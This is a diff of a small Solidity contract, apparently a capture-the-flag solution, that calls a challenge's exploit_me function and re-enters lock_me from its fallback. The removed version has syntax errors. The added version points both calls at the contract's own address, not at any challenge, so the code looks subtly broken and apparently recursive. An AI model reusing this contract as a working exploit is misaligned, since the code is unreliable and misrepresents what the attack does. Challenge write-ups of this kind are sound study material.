@@ -1,26 +1,18 @@
 // SPDX-License-Identifier: GPL-3.0
-
-pragma solidity 0.8.7;
+pragma solidity ^0.8.9;
 
 interface IChallenge {
-    function exploit_me(address winner) public
-    function lock_me() public
+    function exploit_me(address winner) external;
+    function lock_me() external;
 }
 
 contract TOB {
-    address challengeContract;
-    address winner;
+    constructor(){}
 
-    constructor(address _contract, address _winner){
-        challengeContract = _contract;
-        winner = _winner;
+    function exploit() external {
+        IChallenge(address(this)).exploit_me(msg.sender);
     }
-
-    function exploit() public {
-        IChallenge(challengeContract).exploit_me(winner)
-    }
-
-    fallback() payable {
-        IChallenge(challengeContract).lock_me()
+    fallback() external {
+        IChallenge(address(this)).lock_me();
     }
 }
